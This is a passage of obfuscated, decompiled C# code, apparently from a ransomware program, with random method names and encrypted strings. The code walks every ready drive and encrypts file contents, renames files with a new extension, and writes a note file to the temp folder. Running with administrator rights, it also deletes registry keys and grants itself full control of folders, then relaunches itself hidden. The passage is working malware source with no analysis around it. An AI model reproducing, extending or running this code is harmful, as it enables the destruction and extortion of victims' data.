						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107391503), getString_0(107393922)) + getString_0(107391526));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator5)?.Dispose();
		}
	}

	public static bool tsaCzkUrwgAcbqs()
	{
		WebRequest webRequest = WebRequest.Create(getString_0(107391517));
		try
		{
			webRequest.GetResponse();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static void wdbDsjzTMTZdknmj(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = sZXTHnjVRHJHh(getString_0(107391484));
		processStartInfo.Arguments = getString_0(107391455) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool fKMTyXTcEn(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static string ZIfBSJmobgaGiR(SecureString secureString_0)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(secureString_0);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void KUYPzuHTWukLY()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = GWbGalFEHz(getString_0(107391450));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(sZXTHnjVRHJHh(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(sZXTHnjVRHJHh(getString_0(107390768)));
					registryKey.DeleteSubKey(sZXTHnjVRHJHh(getString_0(107390743)));
					registryKey.DeleteSubKey(sZXTHnjVRHJHh(getString_0(107390758)));
					registryKey.DeleteSubKey(sZXTHnjVRHJHh(getString_0(107390701)));
					registryKey.DeleteSubKey(sZXTHnjVRHJHh(getString_0(107391484)));
					registryKey.DeleteSubKey(sZXTHnjVRHJHh(getString_0(107390676)));
					registryKey.DeleteSubKey(sZXTHnjVRHJHh(getString_0(107390647)));
					registryKey.Close();
				}
				string_ = GWbGalFEHz(getString_0(107390662));
				registryKey = Registry.LocalMachine.OpenSubKey(sZXTHnjVRHJHh(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(sZXTHnjVRHJHh(getString_0(107391077)));
					registryKey.Close();
				}
				string_ = GWbGalFEHz(getString_0(107391028));
				registryKey = Registry.LocalMachine.OpenSubKey(sZXTHnjVRHJHh(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(sZXTHnjVRHJHh(getString_0(107391077)));
					registryKey.Close();
				}
				string_ = GWbGalFEHz(getString_0(107391028));
				registryKey = Registry.CurrentUser.OpenSubKey(sZXTHnjVRHJHh(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(sZXTHnjVRHJHh(getString_0(107391077)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			tNIQYAGwSjGxNLsorK(sZXTHnjVRHJHh(getString_0(107391043)), sZXTHnjVRHJHh(getString_0(107390994)));
			tNIQYAGwSjGxNLsorK(sZXTHnjVRHJHh(getString_0(107390977)), sZXTHnjVRHJHh(getString_0(107390936)));
			tNIQYAGwSjGxNLsorK(sZXTHnjVRHJHh(getString_0(107390977)), sZXTHnjVRHJHh(getString_0(107390310)));
			tNIQYAGwSjGxNLsorK(sZXTHnjVRHJHh(getString_0(107390217)), sZXTHnjVRHJHh(getString_0(107390200)));
		}
		catch
		{
		}
	}

	public static void sDwSpKRRMNhM(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(sZXTHnjVRHJHh(getString_0(107390127)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void XzKzaBmetL()
	{
		string string_ = GWbGalFEHz(getString_0(107390102));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(sZXTHnjVRHJHh(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(sZXTHnjVRHJHh(getString_0(107390565)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void vNWFGBoTjkX()
	{
		tNIQYAGwSjGxNLsorK(getString_0(107397216), sZXTHnjVRHJHh(getString_0(107390532)));
		string text = sZXTHnjVRHJHh(getString_0(107390338));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107391508) + text + getString_0(107391508) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107397216);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void JssUHHdLdRbEoAc(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
		}
		catch (Exception ex)
		{
			if (CWJvOLeqgyddlcWAG)
			{
				try
				{
					File.AppendAllText(CaiUUOOprZSOI, getString_0(107389761) + string_0 + getString_0(107389720) + ex.Message + getString_0(107396672));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string joaHINJofMtf()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107393922);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107389663);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107389654))) ? getString_0(107389668) : getString_0(107389645));
				break;
			case 0:
				text = getString_0(107389691);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107389658);
				break;
			case 4:
				text = getString_0(107389613);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107389627) : getString_0(107389636));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107389603) : getString_0(107389608)) : getString_0(107389581)) : getString_0(107389590));
				break;
			case 10:
				text = getString_0(107389598);
				break;
			}
		}
		if (text != getString_0(107393922))
		{
			text = getString_0(107389593) + text;
			if (oSVersion.ServicePack != getString_0(107393922))
			{
				text = text + getString_0(107393004) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string VBvOSUjcFgZq(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395286);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(sZXTHnjVRHJHh(getString_0(107395253)));
				streamWriter.WriteLine(getString_0(107396672));
				streamWriter.WriteLine(sZXTHnjVRHJHh(getString_0(107393811)));
				streamWriter.WriteLine(string_0);
			}
			else
			{
				File.AppendAllText(text, getString_0(107393733) + string_0);
			}
			return text;
		}
		catch (Exception ex)
		{
			if (CWJvOLeqgyddlcWAG)
			{
				try
				{
					File.AppendAllText(CaiUUOOprZSOI, getString_0(107389548) + ex.Message + getString_0(107396672));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void cbHMsnrHiiZrBk(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		LLDMTFcEXhh.GNKAyfVSTBLxew CS_0024_003C_003E8__locals0 = new LLDMTFcEXhh();
		CS_0024_003C_003E8__locals0.JudZdCSJmIW = string_1;
		CS_0024_003C_003E8__locals0.QfrAQDrBEfACUm = string_2;
		CS_0024_003C_003E8__locals0.QSxMqRgctyX = string_3;
		CS_0024_003C_003E8__locals0.gOAslwSOfkqdQQH = string_4;
		hEBhhxLGASeyx = Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.QSxMqRgctyX);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107395913))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !NHjEeCAIyKCHA.Contains(array[i].Name))
					{
						NHjEeCAIyKCHA.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!NHjEeCAIyKCHA.Contains(string_0[j]))
				{
					NHjEeCAIyKCHA.Add(string_0[j]);
				}
			}
		}
		if (NHjEeCAIyKCHA.Contains(sZXTHnjVRHJHh(getString_0(107390003))) && iJXehZAzevnrWv == getString_0(107396787))
		{
			NHjEeCAIyKCHA.Remove(sZXTHnjVRHJHh(getString_0(107390003)));
		}
		Parallel.ForEach(NHjEeCAIyKCHA, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new LLDMTFcEXhh.GNKAyfVSTBLxew();
			CS_0024_003C_003E8__locals0.ahhqshoxNrRET = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.tdDTTRBPFn = string_0;
			if (kTvNgjuGRAjhCBkP && !joaHINJofMtf().Contains(LLDMTFcEXhh.getString_0(107389636)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						fKMTyXTcEn(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.tdDTTRBPFn);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (JVeOnCXrBINQO == LLDMTFcEXhh.getString_0(107396796))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					DnmVEuJxrGIR(CS_0024_003C_003E8__locals0.tdDTTRBPFn, CS_0024_003C_003E8__locals0.ahhqshoxNrRET.JudZdCSJmIW, CS_0024_003C_003E8__locals0.ahhqshoxNrRET.gOAslwSOfkqdQQH, CS_0024_003C_003E8__locals0.ahhqshoxNrRET.QfrAQDrBEfACUm, CS_0024_003C_003E8__locals0.ahhqshoxNrRET.QSxMqRgctyX);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				DnmVEuJxrGIR(CS_0024_003C_003E8__locals0.tdDTTRBPFn, CS_0024_003C_003E8__locals0.JudZdCSJmIW, CS_0024_003C_003E8__locals0.gOAslwSOfkqdQQH, CS_0024_003C_003E8__locals0.QfrAQDrBEfACUm, CS_0024_003C_003E8__locals0.QSxMqRgctyX);
			}
		});
	}

	public static void DnmVEuJxrGIR(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107393922));
		List<string> list3 = list2;
		if (cpkjXbtgFj == getString_0(107396244))
		{
			list = MpmnMNaZWYuJUDG(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = FuGQhFBTslqdS.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_039f;
					}
				}
				if ((OkcrlmVDImyG == getString_0(107396244) && !item.EndsWith(text)) || yDDNFePBurFmPAas.Contains(item))
				{
					continue;
				}
				if (nFUAVKfCtKjV == getString_0(107396787))
				{
					try
					{
						if (jAheqKSOfaYtGZ.pztpnQjPfhyj(item))
						{
							jAheqKSOfaYtGZ.JvTfEzXPgRf(item);
						}
					}
					catch
					{
					}
				}
				yDDNFePBurFmPAas.Add(item);
				if (!EmJIhpwRkVaJOMp.Contains(Path.GetDirectoryName(item)))
				{
					EmJIhpwRkVaJOMp.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (WDFbbikzqbHCmt == getString_0(107396787) && fileStream.Length > Convert.ToInt32(gxaokSriQGuW) * 1024 * 1024 && !list3.Contains(text))
					{
						if (JdQhqbSZaoMfQdp == getString_0(107396787))
						{
							foreach (string item2 in nSXBpdGwvrZMVvqT)
							{
								if (item.ToLower().EndsWith(item2) && PCTnOOIsiyb == getString_0(107396787))
								{
									if (Convert.ToInt32(ZqUFXQYlIUOG) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											fSyEEKEvmFT.dOvkKfZERAIf(getString_0(107393971), getString_0(107393966), getString_0(107393985), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && PCTnOOIsiyb == getString_0(107396244))
								{
									try
									{
										fSyEEKEvmFT.dOvkKfZERAIf(getString_0(107393971), getString_0(107393966), getString_0(107393985), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = HUMYHcgEnuXOnA.SAmmtsGWAzQW(item, Convert.ToInt32(gxaokSriQGuW) * 1024 * 1024);
						byte[] qYKKNYYyDxc = HUMYHcgEnuXOnA.DxLpvUxqllVZ(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						HUMYHcgEnuXOnA.zrGRplxDVNnVZ(item, qYKKNYYyDxc);
						if (string_2 != getString_0(107389994))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107389994))
					{
						vhgvqczCswCXHD(item, item + string_2, hEBhhxLGASeyx);
					}
					else
					{
						vhgvqczCswCXHD(item, item + getString_0(107390021), hEBhhxLGASeyx);
					}
				}
				catch (Exception)
				{
				}
				IL_039f:;
			}
		}
	}

	public static void TjIOQNxtKtnhMPtdZ(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		PXwRYXTOzmdXR.ayxsjdGAqFgNsZPl CS_0024_003C_003E8__locals0 = new PXwRYXTOzmdXR();
		CS_0024_003C_003E8__locals0.XGytlEcpSakio = list_0;
		CS_0024_003C_003E8__locals0.SYtBaLuBfRpuAO = string_1;
		CS_0024_003C_003E8__locals0.jAWPTzrUNwKuz = string_2;
		CS_0024_003C_003E8__locals0.aldVhKQaAlMhN = string_3;
		CS_0024_003C_003E8__locals0.yWDaZLmyyfvdw = new List<string> { getString_0(107393922) };
		if (OkcrlmVDImyG == getString_0(107396244))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.XGytlEcpSakio)
				{
					if (CS_0024_003C_003E8__locals0.jAWPTzrUNwKuz.Length != 0)
					{
						string[] jAWPTzrUNwKuz2 = CS_0024_003C_003E8__locals0.jAWPTzrUNwKuz;
						int num2 = 0;
						while (num2 < jAWPTzrUNwKuz2.Length)
						{
							string value2 = jAWPTzrUNwKuz2[num2];
							if (!item.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_06c5;
						}
					}
					try
					{
						if (item.EndsWith(CS_0024_003C_003E8__locals0.SYtBaLuBfRpuAO))
						{
							goto IL_06c5;
						}
					}
					catch (Exception)
					{
						goto IL_06c5;
					}
					if (item.EndsWith(string_0) && !yDDNFePBurFmPAas.Contains(item))
					{
						if (nFUAVKfCtKjV == PXwRYXTOzmdXR.getString_0(107396804))
						{
							try
							{
								if (jAheqKSOfaYtGZ.pztpnQjPfhyj(item))
								{
									jAheqKSOfaYtGZ.JvTfEzXPgRf(item);
								}
							}
							catch
							{
							}
						}
						yDDNFePBurFmPAas.Add(item);
						if (!EmJIhpwRkVaJOMp.Contains(Path.GetDirectoryName(item)))
						{
							EmJIhpwRkVaJOMp.Add(Path.GetDirectoryName(item));
						}
						JssUHHdLdRbEoAc(item);
						try
						{
							try
							{
								if (new FileInfo(item).Length != 0L)
								{
									goto end_IL_00ef;
								}
								goto end_IL_00ef_2;
								end_IL_00ef:;
							}
							catch (Exception ex12)
							{
								if (CWJvOLeqgyddlcWAG)
								{
									try
									{
										File.AppendAllText(CaiUUOOprZSOI, PXwRYXTOzmdXR.getString_0(107389778) + item + PXwRYXTOzmdXR.getString_0(107406976) + ex12.Message + PXwRYXTOzmdXR.getString_0(107396689));
									}
									catch (Exception)
									{
									}
								}
								goto end_IL_00ef_2;
							}
							if (WDFbbikzqbHCmt == PXwRYXTOzmdXR.getString_0(107396804) && new FileInfo(item).Length > Convert.ToInt32(gxaokSriQGuW) * 1024 * 1024 && !CS_0024_003C_003E8__locals0.yWDaZLmyyfvdw.Contains(string_0))
							{
								CS_0024_003C_003E8__locals0 = new PXwRYXTOzmdXR.VEsBZGuDpIibgNB();
								CS_0024_003C_003E8__locals0.pvNqNLeMtzhIFZ = CS_0024_003C_003E8__locals0;
								try
								{
									if (CS_0024_003C_003E8__locals0.SYtBaLuBfRpuAO != PXwRYXTOzmdXR.getString_0(107390011))
									{
										File.Move(item, item + CS_0024_003C_003E8__locals0.SYtBaLuBfRpuAO);
									}
								}
								catch (Exception ex14)
								{
									if (!CWJvOLeqgyddlcWAG)
									{
										break;
									}
									try
									{
										File.AppendAllText(CaiUUOOprZSOI, PXwRYXTOzmdXR.getString_0(107389778) + item + PXwRYXTOzmdXR.getString_0(107407427) + ex14.Message + PXwRYXTOzmdXR.getString_0(107396689));
										break;
									}
									catch (Exception)
									{
										break;
									}
								}
								CS_0024_003C_003E8__locals0.qQCPaFtSnya = PXwRYXTOzmdXR.getString_0(107393939);
								if (CS_0024_003C_003E8__locals0.SYtBaLuBfRpuAO != PXwRYXTOzmdXR.getString_0(107390011))
								{
									CS_0024_003C_003E8__locals0.qQCPaFtSnya = item + CS_0024_003C_003E8__locals0.SYtBaLuBfRpuAO;
								}
								else
								{
									CS_0024_003C_003E8__locals0.qQCPaFtSnya = item;
								}
								if (JdQhqbSZaoMfQdp == PXwRYXTOzmdXR.getString_0(107396804))
								{
									Thread thread2 = new Thread((ThreadStart)delegate
									{
										foreach (string item2 in nSXBpdGwvrZMVvqT)
										{
											if (CS_0024_003C_003E8__locals0.qQCPaFtSnya.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.pvNqNLeMtzhIFZ.SYtBaLuBfRpuAO) && PCTnOOIsiyb == PXwRYXTOzmdXR.VEsBZGuDpIibgNB.getString_0(107396807))
											{
												if (Convert.ToInt32(ZqUFXQYlIUOG) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.qQCPaFtSnya).Length)
												{
													try
													{
														fSyEEKEvmFT.dOvkKfZERAIf(PXwRYXTOzmdXR.VEsBZGuDpIibgNB.getString_0(107393991), PXwRYXTOzmdXR.VEsBZGuDpIibgNB.getString_0(107393986), PXwRYXTOzmdXR.VEsBZGuDpIibgNB.getString_0(107394005), CS_0024_003C_003E8__locals0.qQCPaFtSnya);
													}
													catch
													{
													}
												}
											}
											else if (CS_0024_003C_003E8__locals0.qQCPaFtSnya.ToLower().EndsWith(item2) && PCTnOOIsiyb == PXwRYXTOzmdXR.VEsBZGuDpIibgNB.getString_0(107396264))
											{
												try
												{
													fSyEEKEvmFT.dOvkKfZERAIf(PXwRYXTOzmdXR.VEsBZGuDpIibgNB.getString_0(107393991), PXwRYXTOzmdXR.VEsBZGuDpIibgNB.getString_0(107393986), PXwRYXTOzmdXR.VEsBZGuDpIibgNB.getString_0(107394005), CS_0024_003C_003E8__locals0.qQCPaFtSnya);
												}
												catch
												{
												}
											}
										}
									});
									thread2.Priority = ThreadPriority.Normal;
									thread2.IsBackground = false;
									thread2.Start();
								}
								string text3 = aoktqsPyKNrT.bQYenalhegZpc(32);
								string s3 = KFckqrNJGkCunhP.SqbbFIeFDghCLc(text3);
								byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
								byte[] array2 = null;
								byte[] byte_2 = HUMYHcgEnuXOnA.SAmmtsGWAzQW(CS_0024_003C_003E8__locals0.qQCPaFtSnya, Convert.ToInt32(gxaokSriQGuW) * 1024 * 1024);
								HUMYHcgEnuXOnA.zrGRplxDVNnVZ(qYKKNYYyDxc: (!EgxLiKEDXzXg) ? (dTyBwXiyZmm ? HUMYHcgEnuXOnA.DxLpvUxqllVZ(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : HUMYHcgEnuXOnA.DxLpvUxqllVZ(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.aldVhKQaAlMhN), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (dTyBwXiyZmm ? gtaxXmzNukhl.IRClroQZINdrf(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : gtaxXmzNukhl.IRClroQZINdrf(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.aldVhKQaAlMhN), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), qGxsFVvELQptUE: CS_0024_003C_003E8__locals0.qQCPaFtSnya, lzOOtsdFUZeYWVN: bytes3);
							}
							else
							{
								string text4 = aoktqsPyKNrT.bQYenalhegZpc(32);
								string s4 = KFckqrNJGkCunhP.SqbbFIeFDghCLc(text4);
								byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
								if (CS_0024_003C_003E8__locals0.SYtBaLuBfRpuAO != PXwRYXTOzmdXR.getString_0(107390011))
								{
									if (!IiEkQrvmRIR)
									{
										if (!dTyBwXiyZmm)
										{
											jBEvNeuZST(item, item + CS_0024_003C_003E8__locals0.SYtBaLuBfRpuAO, hEBhhxLGASeyx);
										}
										else
										{
											jBEvNeuZST(item, item + CS_0024_003C_003E8__locals0.SYtBaLuBfRpuAO, Encoding.ASCII.GetBytes(text4));
										}
									}
									else
									{
										try
										{
											if (!dTyBwXiyZmm)
											{
												SQUjNlFwpPPbBg(item, item + CS_0024_003C_003E8__locals0.SYtBaLuBfRpuAO, hEBhhxLGASeyx);
											}
											else
											{
												SQUjNlFwpPPbBg(item, item + CS_0024_003C_003E8__locals0.SYtBaLuBfRpuAO, Encoding.ASCII.GetBytes(text4));
											}
										}
										catch (Exception ex16)
										{
											if (CWJvOLeqgyddlcWAG)
											{
												try
												{
													File.AppendAllText(CaiUUOOprZSOI, PXwRYXTOzmdXR.getString_0(107389778) + item + PXwRYXTOzmdXR.getString_0(107390029) + ex16.Message + PXwRYXTOzmdXR.getString_0(107396689));
												}
												catch (Exception)
												{
												}
											}
										}
									}
								}
								else if (!IiEkQrvmRIR)
								{
									if (!dTyBwXiyZmm)
									{
										jBEvNeuZST(item, item + PXwRYXTOzmdXR.getString_0(107390038), hEBhhxLGASeyx);
									}
									else
									{
										jBEvNeuZST(item, item + PXwRYXTOzmdXR.getString_0(107390038), Encoding.ASCII.GetBytes(text4));
									}
								}
								else
								{
									try
									{
										if (!dTyBwXiyZmm)
										{
											SQUjNlFwpPPbBg(item, item, hEBhhxLGASeyx);
										}
										else
										{
											SQUjNlFwpPPbBg(item, item, Encoding.ASCII.GetBytes(text4));
										}
									}
									catch (Exception ex18)
									{
										if (CWJvOLeqgyddlcWAG)
										{
											try
											{
												File.AppendAllText(CaiUUOOprZSOI, PXwRYXTOzmdXR.getString_0(107389778) + item + PXwRYXTOzmdXR.getString_0(107390029) + ex18.Message + PXwRYXTOzmdXR.getString_0(107396689));
											}
											catch (Exception)
											{
											}
										}
									}
								}
								if (dTyBwXiyZmm)
								{
									if (CS_0024_003C_003E8__locals0.SYtBaLuBfRpuAO != PXwRYXTOzmdXR.getString_0(107390011))
									{
										sDwSpKRRMNhM(item + CS_0024_003C_003E8__locals0.SYtBaLuBfRpuAO, bytes4);
									}
									else
									{
										sDwSpKRRMNhM(item, bytes4);
									}
								}
							}
							goto IL_06c5;
							end_IL_00ef_2:;
						}
						catch (Exception)
						{
							goto IL_06c5;
						}
					}
					continue;
					IL_06c5:
					CS_0024_003C_003E8__locals0.XGytlEcpSakio.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.XGytlEcpSakio, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new PXwRYXTOzmdXR.ayxsjdGAqFgNsZPl();
			CS_0024_003C_003E8__locals0.pvNqNLeMtzhIFZ = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.qovmJnexGQHr = string_0;
			if (CS_0024_003C_003E8__locals0.jAWPTzrUNwKuz.Length != 0)
			{
				string[] jAWPTzrUNwKuz = CS_0024_003C_003E8__locals0.jAWPTzrUNwKuz;
				int num = 0;
				while (num < jAWPTzrUNwKuz.Length)
				{
					string value = jAWPTzrUNwKuz[num];
					if (!CS_0024_003C_003E8__locals0.qovmJnexGQHr.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0748;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.qovmJnexGQHr.EndsWith(CS_0024_003C_003E8__locals0.SYtBaLuBfRpuAO))
				{
					goto IL_0748;
				}
			}
			catch (Exception)
			{
				goto IL_0748;
			}
			if (!yDDNFePBurFmPAas.Contains(CS_0024_003C_003E8__locals0.qovmJnexGQHr))
			{
				if (nFUAVKfCtKjV == PXwRYXTOzmdXR.getString_0(107396804))
				{
					try
					{
						if (jAheqKSOfaYtGZ.pztpnQjPfhyj(CS_0024_003C_003E8__locals0.qovmJnexGQHr))
						{
							jAheqKSOfaYtGZ.JvTfEzXPgRf(CS_0024_003C_003E8__locals0.qovmJnexGQHr);
						}
					}
					catch
					{
					}
				}
				yDDNFePBurFmPAas.Add(CS_0024_003C_003E8__locals0.qovmJnexGQHr);
				if (!EmJIhpwRkVaJOMp.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.qovmJnexGQHr)))
				{
					EmJIhpwRkVaJOMp.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.qovmJnexGQHr));
				}
				JssUHHdLdRbEoAc(CS_0024_003C_003E8__locals0.qovmJnexGQHr);
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.qovmJnexGQHr).Length != 0L)
						{
							goto end_IL_0117;
						}
						goto end_IL_0117_2;
						end_IL_0117:;
					}
					catch (Exception ex2)
					{
						if (CWJvOLeqgyddlcWAG)
						{
							try
							{
								File.AppendAllText(CaiUUOOprZSOI, PXwRYXTOzmdXR.getString_0(107389778) + CS_0024_003C_003E8__locals0.qovmJnexGQHr + PXwRYXTOzmdXR.getString_0(107406976) + ex2.Message + PXwRYXTOzmdXR.getString_0(107396689));
							}
							catch (Exception)
							{
							}
						}
						goto end_IL_0117_2;
					}
					if (WDFbbikzqbHCmt == PXwRYXTOzmdXR.getString_0(107396804) && new FileInfo(CS_0024_003C_003E8__locals0.qovmJnexGQHr).Length > Convert.ToInt32(gxaokSriQGuW) * 1024 * 1024)
					{
						try
						{
							if (CS_0024_003C_003E8__locals0.SYtBaLuBfRpuAO != PXwRYXTOzmdXR.getString_0(107390011))
							{
								File.Move(CS_0024_003C_003E8__locals0.qovmJnexGQHr, CS_0024_003C_003E8__locals0.qovmJnexGQHr + CS_0024_003C_003E8__locals0.SYtBaLuBfRpuAO);
							}
						}
						catch (Exception ex4)
						{
							if (CWJvOLeqgyddlcWAG)
							{
								try
								{
									File.AppendAllText(CaiUUOOprZSOI, PXwRYXTOzmdXR.getString_0(107389778) + CS_0024_003C_003E8__locals0.qovmJnexGQHr + PXwRYXTOzmdXR.getString_0(107407427) + ex4.Message + PXwRYXTOzmdXR.getString_0(107396689));
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
							return;
						}
						if (CS_0024_003C_003E8__locals0.SYtBaLuBfRpuAO != PXwRYXTOzmdXR.getString_0(107390011))
						{
							CS_0024_003C_003E8__locals0.qovmJnexGQHr += CS_0024_003C_003E8__locals0.SYtBaLuBfRpuAO;
						}
						if (JdQhqbSZaoMfQdp == PXwRYXTOzmdXR.getString_0(107396804))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item3 in nSXBpdGwvrZMVvqT)
								{
									if (CS_0024_003C_003E8__locals0.qovmJnexGQHr.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.pvNqNLeMtzhIFZ.SYtBaLuBfRpuAO) && PCTnOOIsiyb == PXwRYXTOzmdXR.ayxsjdGAqFgNsZPl.getString_0(107396810))
									{
										if (Convert.ToInt32(ZqUFXQYlIUOG) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.qovmJnexGQHr).Length)
										{
											try
											{
